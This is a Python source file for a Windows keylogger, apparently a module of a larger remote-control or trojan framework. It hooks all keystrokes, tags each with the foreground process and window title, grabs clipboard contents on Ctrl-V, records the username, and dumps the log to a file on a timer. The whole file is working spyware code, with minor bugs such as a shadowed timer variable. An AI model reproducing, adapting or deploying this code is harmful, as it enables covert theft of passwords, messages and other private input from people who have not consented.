from ctypes import *
from threading import Timer
import pythoncom
import pyHook 
import win32clipboard
import win32api
import win32con
import getpass
import time

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None
main_thread_id = win32api.GetCurrentThreadId()
timer 	= 0
user_info = getpass.getuser()

logger = ""

def run(**args):
        print "[*] In keylogger mod"

        timer = 60*(float(args['time']))

        #start keylogger for a time period
        startLog()

        return logger

def on_timer():
        logfile = open("output.txt", 'w')
        logfile.write(logger)
        logfile.close()
        win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);
    

def get_current_process():
        global logger
        
        # get a handle to the foreground window
        hwnd = user32.GetForegroundWindow()

        # find the process ID
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # store the current process ID
        process_id = "%d" % pid.value

        # grab the executable
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

        # now read it's title
        window_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title),512)

        # print out the header if we're in the right process
        print
        print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        print

        logger += "\n"
        logger += "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        logger += "\n"


        # close handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)
    
def KeyStroke(event):

        global current_window, logger   

        # check to see if target changed windows
        if event.WindowName != current_window:
                current_window = event.WindowName        
                get_current_process()

        # if they pressed a standard key
        if event.Ascii > 32 and event.Ascii < 127:
                print chr(event.Ascii),
                logger += chr(event.Ascii)
        else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
                if event.Key == "V":
                    win32clipboard.OpenClipboard()
                    pasted_value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print "[PASTE] - %s" % (pasted_value),
                    logger += "[PASTE] - %s" % (pasted_value)
                else:
                    print "[%s]" % event.Key,
                    logger += "[%s]" % event.Key

        # pass execution to next hook registered 
        return True

def startLog():
        global logger

        print "User: %s" % user_info
        print (time.strftime("%d/%m/%Y - %H:%M:%S"))
        print

        logger += "User: %s\n" % user_info
        logger += str((time.strftime("%d/%m/%Y - %H:%M:%S")))
        logger += "\n"

        t = Timer(timer, on_timer) # Quit after 300 (5 minutes) seconds
        t.start()

        # create and register a hook manager 
        kl         = pyHook.HookManager()
        kl.KeyDown = KeyStroke

        # register the hook and execute forever
        kl.HookKeyboard()
        pythoncom.PumpMessages()

#run(time=0.5)


